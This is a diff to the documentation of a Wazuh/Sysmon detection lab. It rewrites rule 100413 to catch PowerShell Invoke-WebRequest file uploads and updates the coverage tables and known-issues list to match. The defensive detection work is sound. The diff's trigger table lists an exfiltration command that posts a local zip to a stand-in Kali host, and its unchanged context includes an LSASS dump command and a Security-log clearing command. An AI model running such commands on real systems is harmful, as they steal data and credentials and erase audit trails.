@@ -373,7 +373,8 @@ A Wazuh rule can only fire if the event exists. The Sysmon configuration is [`sy
 | Event | Used by | What `sysmon_config.xml` does | Effect on the rules |
 |---|---|---|---|
 | **1** ProcessCreate | `100400`–`100403`, `100407` | `onmatch="exclude"`: everything is logged except the listed noise | Covered |
-| **3** NetworkConnect | `100404`, `100413`, `100414` | Include list: specific images (`powershell.exe`, `cmd.exe`, `certutil.exe`, `bitsadmin.exe`, `nc.exe`, …), any binary under `C:\Users`, `C:\ProgramData`, `C:\Windows\Temp`, and a port list (22, 3389, 4444, 5900, …). Excludes Defender, Teams, `*.microsoft.com`, loopback | `100404` and `100414` are covered because PowerShell / cmd / certutil are included. `100413` (port 4445) is logged only when the process matches the include list — port 4445 itself is **not** in the list |
+| **3** NetworkConnect | `100404`, `100414` | Include list: specific images (`powershell.exe`, `cmd.exe`, `certutil.exe`, `bitsadmin.exe`, `nc.exe`, …), any binary under `C:\Users`, `C:\ProgramData`, `C:\Windows\Temp`, and a port list (22, 3389, 4444, 5900, …). Excludes Defender, Teams, `*.microsoft.com`, loopback | `100404` and `100414` are covered because PowerShell / cmd / certutil are included |
+| **PowerShell Operational** (Event 4103 / legacy 800) | `100413` | **Not collected at all.** `ossec.conf` has no `<localfile>` for `Microsoft-Windows-PowerShell/Operational`, and Windows Module Logging (GPO: *Turn on Module Logging*) is a separate prerequisite for the `ContextInfo`/`Payload` fields the rule reads | **Rule cannot fire** until both are added — not a Sysmon telemetry gap, a different channel entirely |
 | **10** ProcessAccess | `100411`, `100416` | `include` filter on `\lsass.exe` (fixed — was empty) | Covered on paper; not yet re-verified against a live test |
 | **11** FileCreate | `100405` | Include by extension and folder (`.exe`, `.dll`, `.ps1`, `.bat`, `\Downloads\`, `\Startup\`, …); no generic `\Temp\` or `\AppData\Roaming\` filter | The rule only sees files already selected by extension/folder, so in practice it flags **executables and scripts** written to Temp or Roaming |
 | **13** RegistryEvent | `100406` | Includes `CurrentVersion\Run` (covers `Run`, `RunOnce`, …) | Covered |
@@ -391,7 +392,7 @@ The rules chain on built-in groups whose names are not consistent (`sysmon_event
 
 | ID | Level | Trigger | Correlation | MITRE |
 |---|---|---|---|---|
-| `100400` | 5 | EID 1, `parentImage` ends with `powershell.exe`, `pwsh.exe`, `cmd.exe` or `net.exe`; excludes `image` in `100402`'s whoami/systeminfo/tasklist/nltest list | none | none |
+| `100400` | 5 | EID 1, `parentImage` ends with `powershell.exe`, `pwsh.exe`, `cmd.exe` or `net.exe`; excludes `image` in `100402`'s list (whoami/systeminfo/tasklist/nltest) plus `curl`/`bitsadmin`/`certutil` (`100403`/`100415`'s targets) | none | none |
 | `100401` | 10 | EID 1, `image` ends with `powershell.exe`, command line matches an encoded-command switch (`-e`/`-ec`/`-en…`) followed by ≥20 non-space chars | none | T1027, T1059.001 |
 | `100402` | 6 | EID 1, image `whoami`, `systeminfo`, `tasklist`, `nltest`, `net` or `net1` | none | T1033, T1082, T1087 |
 | `100403` | 8 | EID 1, image `certutil` or `bitsadmin` | none | T1105 |
@@ -405,7 +406,7 @@ The rules chain on built-in groups whose names are not consistent (`sysmon_event
 | `100411` | 14 | EID 10, `targetImage` ends with `lsass.exe`, `sourceImage` not in the full-path allow-list, `grantedAccess` in a memory-read mask list | none | T1003.001 |
 | `100416` | 15 | Child of `100411`, `callTrace` contains `dbghelp.dll`/`dbgcore.dll` or `UNKNOWN` | none | T1003.001 |
 | `100412` | 15 | Child of built-in `60002` (Security-channel base), `eventID = 1102` | none | T1070.001 |
-| `100413` | 12 | EID 3, destination port `4445` | none | T1041 |
+| `100413` | 9 | **PowerShell Operational** (not Sysmon), `contextInfo` matches `Invoke-WebRequest`, `payload` matches `Uri`/`http`/`Post`/`InFile`/`C:\` | none | T1059.001, T1567.002 |
 | `100414` | 12 | EID 3, image `powershell` or `certutil`, port `80` or `443` | none | T1041, T1105 |
 
 #### `100400` — Shell spawned child process (level 5)
@@ -473,8 +474,27 @@ Child of `100411` (`if_sid 100411`). Raises severity when `callTrace` contains `
 
 **Parent reference was wrong, now corrected.** The rule originally chained from `60117` — this turned out not to be a confirmed ancestor of eventchannel Security events, so `100412` may never have been reached in the rule tree at all for the real `1102` event (a different problem from sibling precedence: the parent itself likely never matched). Per Wazuh's own documented eventchannel chain (all eventchannel logs → `60000` → Security channel specifically → `60002`), `if_sid` is now `60002`, a confirmed real ancestor. **Confirmed working, 2026-10-13.** The built-in `63103` fired instead of `100412` in the original 2026-08-28 evidence (captured when the rule still used `60117`); after the `if_sid=60002` fix, a re-test produced two raw `100412` alerts at the intended level 15, with no `63103` row visible in the same Discover view. See `docs/04`, Stage 10.
 
-#### `100413` — Connection to port 4445 (level 12)
-EID 3 with `destinationPort` equal to `4445`. This is a **lab-specific indicator** for the exfiltration stage (T1041). As the README notes (*Behavior > signatures*), a hard-coded port is easy to change; `100404` and `100414` cover the behaviour. In addition, EID 3 for this port is only logged when the process matches the Sysmon include list.
+#### `100413` — Possible PowerShell data exfiltration (level 9)
+**Rewritten, 2026-10 — no longer network-based.** The previous version matched Sysmon EID 3 on destination port `4445`, a hard-coded indicator easy to evade. The current rule drops the port dependency entirely and instead reads **Windows PowerShell's own Module Logging** output (`Microsoft-Windows-PowerShell/Operational`, Event 4103, or the legacy Event 800) — a telemetry source no other rule in this project uses.
+
+```xml
+<rule id="100413" level="9">
+  <if_sid>60009</if_sid>
+  <field name="win.eventdata.contextInfo" type="pcre2">(?i)Invoke-WebRequest</field>
+  <field name="win.eventdata.payload" type="pcre2">(?i)(Uri|http|Post|InFile|C:\)</field>
+  ...
+</rule>
+```
+
+- `contextInfo` records the command name PowerShell's logging engine captured; matching `Invoke-WebRequest` identifies that this specific cmdlet ran.
+- `payload` records the full parameter-bound invocation text; requiring one of `Uri`/`http`/`Post`/`InFile`/`C:\` narrows it to invocations that name a remote endpoint or an outgoing method/file — in combination, this is the signature of `Invoke-WebRequest -Uri <remote> -Method Post -InFile <local file>`, the canonical PowerShell one-liner for uploading a file to a web endpoint (T1059.001, T1567.002 — Exfiltration to Cloud Storage). Detecting by **command content** rather than port means it fires regardless of which port the request uses.
+- `if_sid=60009` sits outside the `sysmon_event*` tree this file otherwise uses — it is the (inferred, not directly confirmed) base rule for the PowerShell Operational channel, by analogy with the confirmed `60000`/`60002` Security-channel chain (§0.1).
+
+**Cannot fire yet — two unmet preconditions, confirmed against the current repo:**
+1. `ossec.conf` has no `<localfile>` entry for `Microsoft-Windows-PowerShell/Operational` (or the legacy `Windows PowerShell` channel) — Wazuh never receives the event at all.
+2. Windows does not populate `ContextInfo`/`Payload` by default — Module Logging must be turned on via Group Policy (*Administrative Templates → Windows Components → Windows PowerShell → Turn on Module Logging*, module name list set to `*`).
+
+**False-positive risk, by design of the pattern:** `Uri`/`http`/`Post` alone matches any legitimate script calling a REST API (webhooks, license checks, telemetry) — not just exfiltration. `InFile` and a literal `C:\` path are the stronger signals (they imply a local file is the payload being sent); `Uri`/`http`/`Post` alone are weak signals that happen to also be required. No current evidence has been captured either way — see `docs/04`, Stage 11.
 
 #### `100414` — PowerShell / certutil on web ports (level 12)
 EID 3 where the image is `powershell.exe` or `certutil.exe` and the port is 80 or 443. Standard web ports blend into normal traffic; a scripting engine or LOLBin using them is the signal (T1041, T1105). Expect some noise from legitimate scripts; baseline and exclude known destinations.
@@ -543,7 +563,8 @@ File created/modified in a monitored folder
 | Command and Control | T1071 / T1071.004 | `100304`, `100307`, `100404`, `100308` (sid `1000010`) |
 | Command and Control | T1105 Ingress Tool Transfer | `100306`, `100403`, `100415`, `100405`, `100414`, `100309` (sid `1000011`) |
 | Credential Access | T1003.001 LSASS Memory (call-trace escalation) | `100416` |
-| Exfiltration | T1041 Exfiltration Over C2 Channel | `100413`, `100414` |
+| Exfiltration | T1041 Exfiltration Over C2 Channel | `100414` |
+| Exfiltration | T1567.002 Exfiltration to Cloud Storage | `100413` |
 
 ---
 
@@ -563,7 +584,7 @@ Ordered by impact. Items marked *hypothesis* need confirmation with `wazuh-logte
 | 8 | Multi-line PCRE2 values inside `<field>` (whitespace and newlines around the pattern) | Depends on how the XML parser trims content; still present in `100402`, `100403`, `100405`, `100413` | Write each pattern on one line and re-test after any reformatting — not yet done |
 | 9 | ✅ `ossec.conf` declared `eve.json` three times | Possible duplicate events and agent warnings | **Resolved**: a single `localfile` block |
 | 10 | ✅ `100200` (level 7) alerted on every ICMP packet; `100140` could reach its threshold on normal HTTPS bursts | Noise | **Resolved**: `100200` is level 3 + `no_log`; `100140` restricted to admin-service ports |
-| 11 | `100413` hard-codes port 4445 | Blind spot if the port changes | Accepted trade-off: kept as a lab marker; `100404` / `100414` cover the behaviour |
+| 11 | ✅ `100413` used to hard-code port 4445 | Blind spot if the port changes | **Resolved by a full rewrite**, not a tuning fix: the rule now detects `Invoke-WebRequest` usage via PowerShell Module Logging instead of any network port. See its entry in §3.3. New trade-offs: requires a telemetry channel not yet collected (ossec.conf + GPO), and the content-matching approach carries its own false-positive risk — see §3.3 |
 | 12 | `local.rules` sid `1000011` extension list (`.sh/.ps1/.exe/.bat/.dll`) doesn't include `.com` | Missed the EICAR file downloaded in the Stage 6 emulation (`eicar-facebook.com`) | Add `com`, `scr`, `vbs`, `js`, `msi` to the `pcre` extension list |
 | 13 | ✅ `sysmon_rules.xml`, rule `100400`: `description` was missing a closing `)` on `$(win.eventdata.user` | Field substitution didn't resolve correctly in the alert text; cosmetic only | **Resolved** — confirmed via a 2026-10-13 raw alert showing the full value |
 | 14 | `sysmon_rules.xml`, rule `100401`: stray `"` in `description` (`CMD\" $(...)`) | Cosmetic typo in the alert text | Fix to `CMD:` |
@@ -642,6 +663,7 @@ Quick lab triggers (isolated lab VM only):
 | `100410` / `92657` | ...then one correct login with the same `targetUserName`. Confirmed 2026-10-10: `100408` fires correctly; the event that follows is built-in `92657`, not `100410` (see §5, item 2 — still open) |
 | `100411` | `procdump.exe -ma lsass.exe` — **not yet run** (tool not staged); confirmed instead that Windows Defender's own LSASS scan correctly does *not* trigger `100411` (built-in `92900` catches it instead, see `docs/04` Stage 8b) |
 | `100412` | `wevtutil cl Security` (clears the log on the VM) — confirmed firing 2026-10-13, no `63103` observed alongside |
+| `100413` | `Invoke-WebRequest -Uri http://<kali>:8000/upload -Method Post -InFile C:\Windows\Temp\exfil_test.zip` — **cannot fire yet**: add the `Microsoft-Windows-PowerShell/Operational` localfile to `ossec.conf` and enable Module Logging via GPO first (see §3.3) |
 
 Raw-log evidence for each rule (alert JSON, screenshots) belongs in the threat-emulation report.
 
